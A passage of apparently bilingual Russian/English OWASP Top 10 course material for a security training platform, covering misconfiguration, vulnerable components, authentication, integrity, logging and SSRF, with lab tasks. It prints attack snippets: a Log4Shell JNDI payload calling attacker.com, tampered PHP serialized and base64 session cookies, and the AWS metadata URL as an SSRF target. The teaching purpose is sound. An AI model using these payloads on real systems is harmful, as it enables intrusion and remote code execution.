<h3>2. Design vs implementation</h3>
<div class="ebox">Implementation: string-concat SQLi → prepared statements
Design: 4-digit OTP, no rate limit → redesign auth factors + anti-abuse</div>

<h3>3. Common patterns</h3>
<p>Weak recovery, low-entropy codes, no anti-automation, trusting the client for price/role, broken workflows, oversharing data, weak tenant isolation.</p>

<h3>4. OTP brute case</h3>
<p>10,000 four-digit codes without lockout fall in minutes at modest request rates. Fix with entropy, attempt budgets, TTL, binding, monitoring.</p>

<h3>5. STRIDE threat modeling</h3>
<p>Spoofing, Tampering, Repudiation, Information disclosure, DoS, Elevation — apply per DFD element before coding. Add abuse cases to stories.</p>

<h3>6. Secure design principles</h3>
<p>Least privilege, defense in depth, secure defaults, fail-closed, complete mediation, separation of duties, simplicity.</p>

<h3>7. Business logic testing</h3>
<p>Scanners miss these: coupon replay, negative qty, race conditions, step skipping, price tampering.</p>

<h3>8. Real stories</h3>
<p>Bank OTP brute · Follina · Capital One IAM design · PAN storage vs PCI.</p>

<h3>9. How to fix design</h3>
<p>Abuse cases, server invariants, anti-abuse budgets, data minimization, mandatory security design reviews.</p>

<h3>10. Related OWASP</h3>
<p>Feeds A01/A07/A09 failures; still top-tier in 2025 (A06).</p>

<h3>11. Lab</h3>
<p>Brute the 4-digit OTP; compare with lockout-oriented Fix patterns.</p>

<h3>12. Reading</h3>
<p>OWASP Threat Modeling · Shostack · PortSwigger business logic.</p>
`),

/* ═══════════════════════════════════════════════════ A05 ═══ */
A05: M(`
<h3>1. Введение</h3>
<p><strong>Security Misconfiguration</strong> в 2021 была A05; в <strong>OWASP Top 10:2025</strong> поднялась до <strong>A02</strong> — настолько она распространена. Любой слой стека может быть «открыт шире, чем нужно»: app framework, reverse proxy, container, K8s, cloud IAM, storage ACL, default passwords, verbose errors.</p>

<h3>2. Почему так часто</h3>
<ul>
<li>Default insecure (DEBUG on, sample apps, default creds).</li>
<li>Copy-paste configs staging → prod.</li>
<li>Скорость delivery > hardening.</li>
<li>Нет baseline (CIS) и drift detection.</li>
<li>«Временно откроем 0.0.0.0/0» — навсегда.</li>
</ul>

<h3>3. Каталог типичных misconfig</h3>
<p><strong>Application</strong></p>
<ul>
<li><code>DEBUG=True</code>, stack traces с SECRET_KEY, DB URL, paths.</li>
<li>Directory listing, .git exposed, backup files <code>.bak</code>, <code>phpinfo()</code>.</li>
<li>Default admin accounts; install wizards left enabled.</li>
<li>Unnecessary HTTP methods (TRACE/PUT), verbose banners.</li>
</ul>
<p><strong>Security headers</strong></p>
<ul>
<li>Нет CSP, HSTS, X-Content-Type-Options, Frame-Options/CSP frame-ancestors, Referrer-Policy.</li>
<li>CORS <code>*</code> + <code>Access-Control-Allow-Credentials: true</code>.</li>
</ul>
<p><strong>Cloud / infra</strong></p>
<ul>
<li>Public S3/GCS/Azure blobs; world-readable snapshots.</li>
<li>Security groups 0.0.0.0/0 на 22/3389/DB ports.</li>
<li>Overly broad IAM (Action:*, Resource:*).</li>
<li>Kubernetes: privileged pods, anonymous auth, dashboard exposed.</li>
</ul>

<div class="ebox">Django anti-pattern in production:
DEBUG = True
SECRET_KEY = 'django-insecure-...'
ALLOWED_HOSTS = ['*']
# Exception page dumps locals → credentials</div>

<h3>4. Verbose errors как разведка</h3>
<p>Стек-трейс даёт: framework version (подбор CVE), absolute paths (LFI/path guesses), SQL dialect, middleware list, иногда env. В лаборатории A05 ты триггеришь 500 и читаешь SECRET_KEY — это учебный stand-in реальных Django/Spring debug pages.</p>

<h3>5. CIS baselining и hardened images</h3>
<p>Эталон: CIS Benchmarks (OS, Docker, K8s, cloud). Golden images, immutable infra, policy-as-code (OPA, Kyverno, AWS SCPs). Drift: Terraform plan / cloud config audit (Prowler, ScoutSuite).</p>

<h3>6. Как тестировать misconfig</h3>
<ul>
<li>nuclei templates, nikto, gobuster на .git/backup.</li>
<li>securityheaders.com / manual header review.</li>
<li>testssl.sh; check cookie flags.</li>
<li>Cloud: ScoutSuite, Prowler, kube-bench, trivy config.</li>
<li>Спровоцируй ошибки: 404/500, invalid JSON, huge body.</li>
<li>Проверь default creds на admin panels (только authorized!).</li>
</ul>

<h3>7. Реальные инциденты</h3>
<ul>
<li><code>CVE-2017-5638</code> Apache Struts — плюс плохой perimeter; Equifax.</li>
<li>Тысячи open Elasticsearch/Mongo без auth в Shodan.</li>
<li><code>CVE-2019-19781</code> Citrix path traversal на management interface.</li>
<li>Capital One: SSRF + excessive IAM role (A05+A10 design).</li>
<li>Public S3 with backups of customer DB dumps — ежегодно.</li>
</ul>

<h3>8. Hardening checklist</h3>
<ul>
<li>Disable debug; generic error pages; log details server-side only.</li>
<li>Remove samples, default accounts, unused features/ports.</li>
<li>Least-privilege IAM; private storage; no 0.0.0.0/0 on admin.</li>
<li>Security headers; strict CORS allowlist.</li>
<li>Patch cadence; config CI lint; secret scanning.</li>
<li>Separate prod/stage accounts; deny prod credentials on laptops.</li>
</ul>

<div class="ebox">// Node: production errors
app.set('env', 'production');
app.use((err, req, res, next) => {
  logger.error({ err, reqId: req.id });
  res.status(500).json({ error: 'Internal error', reqId: req.id });
});</div>

<h3>9. Связь с 2025 A02</h3>
<p>OWASP поднял misconfiguration выше: automation cloud и контейнеры увеличили blast radius одной галки «public». Читай официальный текст A02:2025 на owasp.org.</p>

<h3>10. Лаборатория</h3>
<p>Trigger 500 → прочитай leaked SECRET_KEY/flag. Проверь «security headers» panel. Fix: generic errors, no env dump.</p>

<h3>11. Чтение</h3>
<p>CIS Benchmarks · OWASP Secure Headers · AWS Well-Architected Security Pillar · Kubernetes CIS · nuclei templates docs.</p>
`, `
<h3>1. Introduction</h3>
<p><strong>Security Misconfiguration</strong> was A05 in 2021 and rose to <strong>A02 in 2025</strong>. Any stack layer can be left too open: frameworks, proxies, containers, cloud IAM, storage ACLs, defaults, verbose errors.</p>

<h3>2. Why so common</h3>
<p>Insecure defaults, staging configs in prod, shipping speed, no CIS baseline, temporary firewall holes that become permanent.</p>

<h3>3. Catalog</h3>
<p>App debug pages, directory listing, default creds, missing security headers, CORS *, public buckets, 0.0.0.0/0 admin ports, broad IAM, privileged K8s pods.</p>
<div class="ebox">DEBUG = True + exception pages → SECRET_KEY and DB URL leakage</div>

<h3>4. Verbose errors as recon</h3>
<p>Stacks reveal versions, paths, SQL dialects, env snippets — gold for attackers.</p>

<h3>5. Baselining</h3>
<p>CIS benchmarks, golden images, policy-as-code, drift detection (Prowler, ScoutSuite, kube-bench).</p>

<h3>6. How to test</h3>
<p>nuclei/nikto, header audits, testssl, cloud/K8s scanners, force 500s, authorized default-cred checks.</p>

<h3>7. Real incidents</h3>
<p>Equifax/Struts · open DBs on Shodan · Citrix ADC · Capital One IAM · public S3 backups.</p>

<h3>8. Hardening checklist</h3>
<p>No debug in prod, generic errors, least privilege, private storage, strict CORS, patching, config CI.</p>

<h3>9. OWASP 2025</h3>
<p>Misconfiguration elevated due to cloud/container blast radius. See official A02:2025 text.</p>

<h3>10. Lab</h3>
<p>Trigger 500, read leaked key/flag, inspect headers, study safe error handling.</p>

<h3>11. Reading</h3>
<p>CIS · OWASP Secure Headers · cloud well-architected · nuclei docs.</p>
`),

/* ═══════════════════════════════════════════════════ A06 ═══ */
A06: M(`
<h3>1. Введение</h3>
<p><strong>Vulnerable and Outdated Components</strong> (OWASP 2021 A06) в 2025 во многом поглощается <strong>A03 Software Supply Chain Failures</strong>. Суть одна: вы запускаете чужой код. Если этот код уязвим или уже backdoored — ваш продукт уязвим, даже если «ваше» приложение написано идеально.</p>

<h3>2. Масштаб проблемы</h3>
<p>Типичный Node/Java сервис: сотни transitive dependencies. Вы pin'ите библиотеку A@1.2.3, A тянет B@4.5.6 с CVE. Без SBOM вы даже не знаете, что B существует. Среднее время от publish CVE до mass exploitation сжимается (Log4Shell — дни и часы).</p>

<h3>3. Типы supply-chain риска</h3>
<ul>
<li><strong>Known CVE в outdated package</strong> — классика A06.</li>
<li><strong>Typosquatting</strong> — <code>lodahs</code> вместо <code>lodash</code>.</li>
<li><strong>Dependency confusion</strong> — private name published to public npm.</li>
<li><strong>Malicious maintainer / account takeover</strong> — event-stream, ua-parser-js, eslint-scope incidents.</li>
<li><strong>Build system compromise</strong> — SolarWinds: backdoor в signed update.</li>
<li><strong>Source ≠ artifact</strong> — XZ: backdoor в release tarball, не в git.</li>
</ul>

<h3>4. Log4Shell — разбор полётов</h3>
<p><code>CVE-2021-44228</code> (CVSS 10.0): Log4j 2.x Message Lookup подставлял JNDI.</p>
<div class="ebox">Любая логируемая строка:
User-Agent: \${jndi:ldap://attacker.com/a}

Log4j → LDAP query → Reference на http://attacker/Evil.class
→ загрузка класса → RCE от имени приложения

Обходы первого патча: \${\${lower:j}ndi:...} и context lookups
(CVE-2021-45046 и далее) — нужен полный upgrade / remove JNDI</div>
<p>Почему катастрофа: Log4j почти везде в Java enterprise; вход — любой header/field, который кто-то залогировал; pre-auth часто.</p>

<h3>5. Другие «иконки» компонента</h3>
<ul>
<li><code>CVE-2022-22965</code> Spring4Shell — classloader manipulation через data binding.</li>
<li><code>CVE-2017-5638</code> Struts2 — Content-Type OGNL (Equifax).</li>
<li>Jackson/Commons Collections — deserialization gadgets.</li>
<li><code>CVE-2024-3094</code> XZ Utils — multi-year social engineering + stealth backdoor.</li>
<li><code>CVE-2024-6387</code> regreSSHion — OpenSSH race condition.</li>
</ul>

<h3>6. SBOM и инвентаризация</h3>
<p><strong>SBOM</strong> (Software Bill of Materials) — список компонентов и версий (CycloneDX, SPDX). Без SBOM нет vulnerability management. Генерируют: <code>syft</code>, <code>cdxgen</code>, <code>trivy image</code>, build plugins.</p>

<h3>7. SCA в пайплайне</h3>
<div class="ebox"># примеры
npm audit --audit-level=high
pip-audit
govulncheck ./...
trivy fs --severity HIGH,CRITICAL .
grype dir:.
# CI: fail build on critical + reachable CVE policy</div>
<p>Dependabot / Renovate — auto PR. Важно: не только «есть CVE», но и <em>reachable</em> / exploitability (VEX, triage).</p>

<h3>8. Как тестировать (attacker view)</h3>
<ul>
<li>Собери tech fingerprint: headers, Wappalyzer, error pages, JS libraries URLs, package-lock если утечёт.</li>
<li>Сравни versions с NVD/OSV/GitHub Advisory.</li>
<li>Nuclei templates под известные CVE paths.</li>
<li>Для логов: JNDI/SSRF-like probes в User-Agent (в lab!).</li>
<li>Container scan: trivy image myapp:latest.</li>
</ul>

<h3>9. Защита — defense in depth</h3>
<ul>
<li>Pin + lockfile; reproducible builds; verify checksums/signatures.</li>
<li>Minimal base images; distroless; few packages.</li>
<li>Private registry allowlist; disable unknown deps in CI.</li>
<li>Rapid patch SLO (critical: 48–72h).</li>
<li>Runtime: WAF/RASP optional; network egress deny by default.</li>
<li>SLSA levels, signed provenance (cosign, sigstore).</li>
</ul>

<h3>10. Процесс vulnerability management</h3>
<ol>
<li>Inventory (SBOM continuous).</li>
<li>Detect (SCA + advisories).</li>
<li>Triage (CVSS, EPSS, reachable, asset criticality).</li>
<li>Remediate (upgrade, patch, WAF virtual patch temporary).</li>
<li>Verify + lessons learned.</li>
</ol>

<h3>11. Реальные lessons learned</h3>
<p>Log4Shell показал: «мы не Java-команда» не спасает — Log4j внутри appliance. XZ показал: trust в maintainer — attack surface. SolarWinds: update channel — crown jewel.</p>

<h3>12. Лаборатория</h3>
<p>SBOM excerpt показывает log4j 2.14.0. Отправь JNDI payload в User-Agent → simulated RCE → flag. Fix: upgrade + SCA gate.</p>

<h3>13. Чтение</h3>
<p>OWASP Dependency-Check · SLSA.dev · CISA Log4Shell guidance · CycloneDX · Google SBOM blog · «The Coming War on Your Supply Chain» talks.</p>
`, `
<h3>1. Introduction</h3>
<p><strong>Vulnerable and Outdated Components</strong> (2021 A06) largely maps to <strong>2025 A03 Supply Chain Failures</strong>. You run other people's code — their CVEs and backdoors become yours.</p>

<h3>2. Scale</h3>
<p>Hundreds of transitive deps; exploit windows measured in hours after disclosure (Log4Shell).</p>

<h3>3. Supply-chain risk types</h3>
<p>Known CVEs, typosquatting, dependency confusion, malicious maintainers, build system compromise, source≠artifact backdoors (XZ).</p>

<h3>4. Log4Shell deep dive</h3>
<div class="ebox">User-Agent: \${jndi:ldap://attacker/a}
→ LDAP → remote class load → RCE
First patches bypassed; full upgrade required</div>

<h3>5. Other icons</h3>
<p>Spring4Shell · Struts/Equifax · deser gadgets · XZ · regreSSHion.</p>

<h3>6. SBOM</h3>
<p>CycloneDX/SPDX inventories via syft, trivy, cdxgen — foundation of vuln management.</p>

<h3>7. SCA in CI</h3>
<p>npm audit, pip-audit, trivy, grype, Dependabot; triage with EPSS/reachability, not CVSS alone.</p>

<h3>8. Attacker testing</h3>
<p>Fingerprint versions, map to advisories, nuclei CVE templates, container scans, logged-field JNDI probes in labs.</p>

<h3>9. Defenses</h3>
<p>Lockfiles, minimal images, private registries, patch SLOs, egress control, signed provenance (SLSA/cosign).</p>

<h3>10. Vuln management process</h3>
<p>Inventory → detect → triage → remediate → verify.</p>

<h3>11. Lessons</h3>
<p>You inherit deps inside appliances; maintainer trust is attack surface; update channels are crown jewels.</p>

<h3>12. Lab</h3>
<p>Send Log4Shell-style UA payload; capture flag; review upgrade/SCA fix.</p>

<h3>13. Reading</h3>
<p>OWASP Dependency-Check · SLSA · CISA Log4Shell · CycloneDX.</p>
`),

/* ═══════════════════════════════════════════════════ A07 ═══ */
A07: M(`
<h3>1. Введение</h3>
<p><strong>Identification and Authentication Failures</strong> (OWASP 2021/2025 A07) — всё, что ломает уверенность «перед нами именно этот субъект»: пароли, MFA, sessions, federation, recovery. Если AuthN слабый, остальные контроли (AuthZ, crypto) часто обходятся через чужую личность.</p>

<h3>2. Атаки на пароли и credentials</h3>
<ul>
<li><strong>Credential stuffing</strong> — пары из других брешей (HIBP, dark web). Работает из‑за password reuse (~60%+ пользователей).</li>
<li><strong>Password spraying</strong> — один частый пароль (Welcome1!) против тысяч учёток; обходит per-account lockout.</li>
<li><strong>Brute force</strong> — классический перебор одной учётки.</li>
<li><strong>Phishing / MFA fatigue / SIM swap</strong> — social + telecom.</li>
</ul>
<div class="ebox">Защита от stuffing:
- MFA (лучше WebAuthn/passkeys)
- Check password against breached corpora on signup/change
- Detect impossible travel / burst login patterns
- Credential stuffing resistant rate limits (per IP + per account + global)</div>

<h3>3. Сессии и cookies</h3>
<p>Сессионный идентификатор должен быть криптостойким random (≥128 bit entropy), непредсказуемым, храниться server-side (или signed+encrypted token с revoke list).</p>
<div class="ebox">// Уязвимо (лаборатория A07)
Set-Cookie: session=base64("user_id=2")
// → attacker sets base64("user_id=1") → admin

// Безопасно
sid = crypto.randomBytes(32).toString('hex')
store[sid] = { userId, exp, ipHash? }
Set-Cookie: session=sid; HttpOnly; Secure; SameSite=Lax; Path=/</div>
<p>Дополнительно: regenerate session id после login (fixation), idle/absolute timeout, logout invalidate server-side, concurrent session policy.</p>

<h3>4. MFA: хорошо и плохо</h3>
<ul>
<li><strong>Хорошо:</strong> WebAuthn/FIDO2, TOTP с rate limit, hardware keys.</li>
<li><strong>Слабее:</strong> SMS (SIM swap, SS7), email OTP (если mailbox already compromised).</li>
<li><strong>Плохой design:</strong> MFA bypass endpoints, «remember this device» без binding, MFA fatigue push spam.</li>
</ul>

<h3>5. JWT как session</h3>
<p>Stateless JWT удобны, но: revocation сложна; длинный TTL опасен; claims role без server re-check → A01/A02. Паттерн: short access token + refresh token rotation (reuse detection).</p>

<h3>6. Password recovery</h3>
<ul>
<li>Token: high entropy, single-use, short TTL, invalidate others.</li>
<li>Не раскрывай, существует ли email (user enumeration) — или осознанно прими tradeoff с UX.</li>
<li>Host header injection в reset links → token на attacker domain.</li>
</ul>

<h3>7. NIST SP 800-63B (современный взгляд)</h3>
<ul>
<li>Минимум длины важнее complexity theater (Password1!).</li>
<li>Не требовать периодическую смену без повода.</li>
<li>Блокировать breached passwords.</li>
<li>Throttling / lockout с разумным UX (не permanent lock DoS).</li>
</ul>

<h3>8. Как тестировать AuthN</h3>
<ul>
<li>Default/weak passwords; stuffing list sample (authorized).</li>
<li>Session cookie entropy (Burp sequencer), fixation, CSRF on logout/login.</li>
<li>JWT tampering (A02 toolkit).</li>
<li>MFA bypass: direct API to post-MFA state; backup codes.</li>
<li>User enumeration via timing/messages.</li>
<li>OAuth/OIDC: redirect_uri, state, PKCE, token leak in URL.</li>
</ul>

<h3>9. Реальные CVE/кейсы</h3>
<ul>
<li><code>CVE-2020-1472</code> ZeroLogon — crypto fail → domain admin (auth of machine accounts).</li>
<li><code>CVE-2022-40684</code> FortiGate auth bypass.</li>
<li><code>CVE-2022-1388</code> F5 iControl auth bypass.</li>
<li>Mass ATO campaigns via stuffing on retail/finance.</li>
</ul>

<h3>10. Чеклист защиты</h3>
<ul>
<li>Modern password policy + breach check + MFA.</li>
<li>Secure session cookies; server-side invalidate.</li>
<li>Generic login errors; rate limit + monitoring (A09).</li>
<li>Hardened recovery; OAuth according to BCP.</li>
<li>No predictable session material (base64 user id…).</li>
</ul>

<h3>11. Лаборатория</h3>
<p>Login as alice → session cookie is base64(user_id). Forge admin id=1 → GET /api/me → flag.</p>

<h3>12. Чтение</h3>
<p>NIST 800-63B · OWASP Authentication Cheat Sheet · Session Management Cheat Sheet · OAuth 2.1 / OIDC best practices · PortSwigger auth labs.</p>
`, `
<h3>1. Introduction</h3>
<p><strong>Identification and Authentication Failures</strong> (A07) cover passwords, MFA, sessions, federation, and recovery. Weak AuthN undermines everything else.</p>

<h3>2. Credential attacks</h3>
<p>Stuffing (breach reuse), spraying, brute force, phishing, MFA fatigue, SIM swap.</p>

<h3>3. Sessions</h3>
<div class="ebox">Bad:  session=base64("user_id=2")
Good: cryptographically random sid + server store
      HttpOnly; Secure; SameSite; regenerate on login</div>

<h3>4. MFA</h3>
<p>Prefer WebAuthn; SMS is weaker; watch for MFA bypass routes and push fatigue.</p>

<h3>5. JWT sessions</h3>
<p>Short TTL, refresh rotation, don't trust role claims without server policy.</p>

<h3>6. Recovery</h3>
<p>High-entropy single-use tokens; short TTL; careful enumeration; host-header safe links.</p>

<h3>7. NIST 800-63B</h3>
<p>Length over complexity theater; breached password blocking; sensible throttling.</p>

<h3>8. Testing</h3>
<p>Weak/default creds, cookie entropy, fixation, JWT tamper, MFA bypass, OAuth redirect_uri/state/PKCE issues.</p>

<h3>9. Incidents</h3>
<p>ZeroLogon · FortiGate/F5 auth bypass · mass stuffing ATOs.</p>

<h3>10. Hardening checklist</h3>
<p>MFA + breach checks, solid sessions, rate limits, monitoring, OAuth BCP.</p>

<h3>11. Lab</h3>
<p>Forge base64 session to admin; capture flag.</p>

<h3>12. Reading</h3>
<p>NIST 800-63B · OWASP AuthN/Session cheatsheets · OAuth 2.1 · PortSwigger auth labs.</p>
`),

/* ═══════════════════════════════════════════════════ A08 ═══ */
A08: M(`
<h3>1. Введение</h3>
<p><strong>Software and Data Integrity Failures</strong> (A08 в 2021 и 2025) — нет гарантии, что код, обновления, CI-артефакты или сериализованные данные не были подменены. Это integrity + trust: auto-update без подписи, insecure deserialization, pipeline poison, client-trusted objects.</p>

<h3>2. Insecure deserialization — ядро темы</h3>
<p>Сериализация превращает объект в байты/строку. Если атакующий контролирует эти байты и сервер их «восстанавливает», он может:</p>
<ul>
<li>Изменить поля (<code>role=admin</code>) — logic integrity fail.</li>
<li>Подставить класс-гаджет → при десериализации выполнится код (RCE) — Java/PHP/Python pickle/.NET.</li>
</ul>
<div class="ebox">// PHP example (lab-style)
O:4:"User":2:{s:4:"role";s:4:"user";s:2:"id";i:2;}
// tamper:
O:4:"User":2:{s:4:"role";s:5:"admin";s:2:"id";i:2;}

// Java: ysoserial gadget chains (CommonsCollections, etc.)
// Python: pickle.loads(user_data)  # never on untrusted input
// .NET: BinaryFormatter (obsolete/dangerous)</div>
<p>Правило: <strong>никогда не десериализуй untrusted data нативным форматом</strong>. JSON + schema + server authority для privileges.</p>

<h3>3. Update and plugin integrity</h3>
<ul>
<li>Auto-updaters without signature verification → MitM replaces binary.</li>
<li>WordPress/plugin model: install from URL without strong authz/integrity.</li>
<li>Mobile apps: sideload; check Play integrity / attestation where relevant.</li>
</ul>

<h3>4. CI/CD as attack surface</h3>
<ul>
<li>Compromised build agent injects backdoor (SolarWinds class).</li>
<li>Poisoned pipeline execution (PPE): PR from fork runs secrets.</li>
<li>Unsigned artifacts promoted to prod.</li>
<li>Over-privileged CI OIDC/cloud roles.</li>
</ul>
<p>Контрмеры: least privilege runners, signed commits/artifacts (sigstore/cosign), environment protection rules, no secrets on pull_request from forks, provenance SLSA.</p>

<h3>5. XZ backdoor (CVE-2024-3094) — учебный кейс supply integrity</h3>
<p>Годы social engineering → maintainer rights → malicious code в release tarball (не обязательно очевидный в git) → sshd путь → потенциальный auth bypass. Урок: trust, review, reproducible builds, diversity of packaging, anomaly detection (performance oddities).</p>

<h3>6. Как искать</h3>
<ul>
<li>Cookies/params с <code>O:</code>, <code>rO0</code>, <code>AC ED</code>, pickle opcodes, .NET ViewState.</li>
<li>Tamper fields → privilege change without new login.</li>
<li>Update endpoints: HTTPS? signature? cert pin?</li>
<li>CI configs: workflow permissions, pull_request_target abuse.</li>
<li>Integrity of S3 artifacts / CDN without signing.</li>
</ul>

<h3>7. Защита</h3>
<ul>
<li>Prefer JSON/protobuf; never pickle/Java native ser from users.</li>
<li>If legacy deser unavoidable: allowlist classes, MAC the blob, sandbox.</li>
<li>Privileges always from server session/DB after authz.</li>
<li>Sign and verify updates; pin certs/keys.</li>
<li>Hardened CI + artifact provenance; dependency pinning (A06 link).</li>
</ul>
<div class="ebox">// Safe pattern
const data = JSON.parse(cookie);
if (!hmacValid(data, SIG)) reject();
const role = await db.getRole(session.userId); // NOT data.role</div>

<h3>8. Реальные инциденты</h3>
<ul>
<li>Java deserialization waves (ysoserial era) on webapps/middleware.</li>
<li><code>CVE-2023-46604</code> ActiveMQ OpenWire ClassPathXml RCE.</li>
<li>SolarWinds SUNBURST.</li>
<li>XZ Utils backdoor.</li>
<li>Malicious npm packages stealing tokens postinstall.</li>
</ul>

<h3>9. Лаборатория</h3>
<p>Cookie profile — PHP-style serialize. Смени role на admin → flag. Fix: JSON + server-side role.</p>

<h3>10. Чтение</h3>
<p>OWASP Deserialization Cheat Sheet · SLSA · sigstore · ysoserial paper/talks · CISA supply chain guidance.</p>
`, `
<h3>1. Introduction</h3>
<p><strong>Software and Data Integrity Failures</strong> (A08) mean you cannot prove code/data was not swapped: unsigned updates, insecure deserialization, poisoned CI, client-trusted objects.</p>

<h3>2. Insecure deserialization</h3>
<p>Attackers modify fields (role=admin) or supply gadget chains for RCE (Java/PHP/pickle/.NET). Never natively deserialize untrusted input.</p>
<div class="ebox">PHP: O:4:"User"… role user → role admin
Java: ysoserial gadgets
Python: pickle.loads(untrusted) # dangerous</div>

<h3>3. Updates & plugins</h3>
<p>Verify signatures; don't install from arbitrary URLs without authz/integrity.</p>

<h3>4. CI/CD</h3>
<p>Hardened runners, signed artifacts, no fork secrets, SLSA provenance, least privilege.</p>

<h3>5. XZ lesson</h3>
<p>Long-term trust abuse + tarball≠git → need reproducible builds and packaging diversity.</p>

<h3>6. How to hunt</h3>
<p>Serialized cookies, ViewState, update channels, CI workflow perms, unsigned CDN artifacts.</p>

<h3>7. Defenses</h3>
<p>JSON+schema+HMAC; server-side privileges; signed updates; secure pipelines.</p>

<h3>8. Incidents</h3>
<p>Java deser era · ActiveMQ · SolarWinds · XZ · malicious npm.</p>

<h3>9. Lab</h3>
<p>Tamper serialized cookie role=admin; capture flag.</p>

<h3>10. Reading</h3>
<p>OWASP Deserialization · SLSA · sigstore · CISA supply chain.</p>
`),

/* ═══════════════════════════════════════════════════ A09 ═══ */
A09: M(`
<h3>1. Введение</h3>
<p><strong>Security Logging and Monitoring Failures</strong> (2021 A09; 2025 A09 — Logging <em>and Alerting</em>). Если атаку не видно и на неё не реагируют — контроля по сути нет. DBIR/IBM часто показывают MTTD в сотни дней. Логи без алертов = дорогой archive.</p>

<h3>2. Зачем логи с точки зрения attacker/defender</h3>
<p><strong>Defender:</strong> detection, forensics, compliance, fraud. <strong>Attacker (pentest finding):</strong> «я сделал 10k login fails — в SIEM пусто» = A09 critical for org resilience even if no direct RCE.</p>

<h3>3. Что обязательно логировать</h3>
<ul>
<li>AuthN: success <em>и</em> failure (username attempted, IP, UA, geo, result, MFA result).</li>
<li>AuthZ failures (403 spikes на admin).</li>
<li>Password reset, email/MFA change, role change, API key create.</li>
<li>Admin actions, config changes, data export/bulk download.</li>
<li>Input validation anomalies, WAF blocks (with care).</li>
<li>System: deploy events, privilege use (sudo), outbound unusual destinations.</li>
</ul>

<h3>4. Чего нельзя логировать</h3>
<div class="ebox">НИКОГДА:
- passwords, password hashes (из форм), session tokens, JWT, API keys
- CVV, full PAN (PCI), secrets from Authorization headers
- избыточные биометрия/health data без необходимости

РИСК: logs → SIEM → tickets → screenshots → third-party support</div>

<h3>5. Качество логов</h3>
<ul>
<li>Структурированные (JSON) > plaintext freeform.</li>
<li>UTC timestamps, request id / trace id (OpenTelemetry).</li>
<li>Stable event names: <code>auth.login.failure</code>.</li>
<li>Enough context to investigate without PII overload.</li>
<li>Integrity: append-only / WORM / signed where required; NTP sync.</li>
</ul>

<div class="ebox">// Good
{"ts":"2024-03-15T03:41:20Z","event":"auth.login.failure","user":"admin","ip":"185.220.101.47","attempt":47,"ua":"..."}

// Bad
DEBUG login password=s3cr3t! user=admin</div>

<h3>6. Monitoring & alerting (2025 emphasis)</h3>
<p>Логи ≠ detection. Нужны use-cases:</p>
<ul>
<li>N failures then success from same IP (brute/stuffing).</li>
<li>Success from new country after failures.</li>
<li>Bulk export after privilege change.</li>
<li>Spike 403 on /admin.</li>
<li>Disable MFA / add new admin user.</li>
</ul>
<p>Метрики SOC: MTTD, MTTR, coverage % critical assets, false positive rate.</p>

<h3>7. SIEM и архитектура</h3>
<p>Ship agents (Fluent Bit, Vector) → pipeline → SIEM (Elastic, Splunk, Sentinel, Chronicle). Retention: hot/warm/cold. Cost control: sample debug, keep security events full fidelity. Detect engineering as product, not ticket spam.</p>

<h3>8. Как тестировать A09 (pentest / purple)</h3>
<ul>
<li>Сделай очевидный brute (в scope) — спроси blue team / проверь SIEM: alert?</li>
<li>Экспорт данных — есть audit row?</li>
<li>Логи доступны без auth? (misconfig+A09).</li>
<li>Log injection: CRLF в username → fake log lines (integrity of audit).</li>
</ul>

<h3>9. Лабораторный кейс RØOT</h3>
<p>В логах виден IP <code>185.220.101.47</code>: десятки FAIL → SUCCESS admin → BULK_DOWNLOAD customers. Это классическая kill chain. Твоя задача — detection: указать IP и суть атаки → flag. Без логов эта история была бы невидима.</p>

<h3>10. Реальные последствия «тишины»</h3>
<p>Ransomware notice от клиентов, не от SOC. APT dwell months. Insider fraud without audit trail. Compliance fails (PCI DSS logging requirements, SOC2).</p>

<h3>11. Чеклист внедрения</h3>
<ul>
<li>Threat model → detection use-cases → instrument code.</li>
<li>Centralize + alert + on-call runbooks.</li>
<li>Red/purple test detections quarterly.</li>
<li>Protect log pipeline itself (authz on SIEM, integrity).</li>
</ul>

<h3>12. Чтение</h3>
<p>OWASP Logging Cheat Sheet · NIST 800-92 · MITRE ATT&CK detection ideas · «Logging and Detection» engineering blogs · PCI DSS logging reqs.</p>
`, `
<h3>1. Introduction</h3>
<p><strong>Security Logging and Monitoring Failures</strong> (2025: Logging <em>and Alerting</em>). If you cannot see or respond to attacks, controls fail in practice. MTTD is often measured in months.</p>

<h3>2. Why it matters</h3>
<p>Detection, forensics, compliance. As a pentest finding: silent brute force means A09 even without RCE.</p>

<h3>3. What to log</h3>
<p>Auth success/fail, authz failures, recovery/MFA/role changes, admin actions, bulk export, high-signal anomalies — with request/trace ids.</p>

<h3>4. What never to log</h3>
<div class="ebox">passwords, tokens, JWTs, API keys, CVV/PAN, raw secrets</div>

<h3>5. Log quality</h3>
<p>Structured JSON, UTC, stable event names, enough context, integrity and time sync.</p>

<h3>6. Alerting (2025 focus)</h3>
<p>Failures→success bursts, impossible travel, bulk export after priv-esc, admin creation, MFA disable. Track MTTD/MTTR.</p>

<h3>7. SIEM architecture</h3>
<p>Ship → parse → detect → respond. Full fidelity for security events; cost-aware sampling for debug noise.</p>

<h3>8. Testing A09</h3>
<p>Obvious attack in scope — did an alert fire? Export audited? Log injection? SIEM open?</p>

<h3>9. Lab story</h3>
<p>IP 185.220.101.47: FAIL storm → admin SUCCESS → bulk customer download. Identify it to capture the flag.</p>

<h3>10. Real impact</h3>
<p>Long APT dwell, ransomware discovered late, compliance failures.</p>

<h3>11. Implementation checklist</h3>
<p>Use-cases from threat model, centralize, on-call runbooks, purple-team tests, protect the log path.</p>

<h3>12. Reading</h3>
<p>OWASP Logging · NIST 800-92 · ATT&CK · PCI logging requirements.</p>
`),

/* ═══════════════════════════════════════════════════ A10 ═══ */
A10: M(`
<h3>1. Введение: две «десятки»</h3>
<p><strong>OWASP 2021 A10 — SSRF</strong> (Server-Side Request Forgery). <strong>OWASP 2025 A10 — Mishandling of Exceptional Conditions</strong> (ошибки, fail-open, глотание exceptions, опасные defaults при сбоях). SSRF никуда не исчез: его часто мапят в A01/A05/injection, но по impact он остаётся top-tier. В RØOT A10 совмещает SSRF lab + fail-open demo.</p>

<h3>2. SSRF — модель угрозы</h3>
<p>Приложение принимает URL (или host/path) от пользователя и само делает запрос. Атакующий заставляет сервер ходить:</p>
<ul>
<li>в cloud metadata (IMDS);</li>
<li>на localhost admin/redis/elastic;</li>
<li>во внутренние RFC1918 сегменты;</li>
<li>на second-order targets через open redirect.</li>
</ul>
<p>Сервер — pivot с доверенной сетевой позицией и часто с IAM role credentials.</p>

<h3>3. Cloud metadata (главный jackpot)</h3>
<div class="ebox">AWS IMDS:
http://169.254.169.254/latest/meta-data/
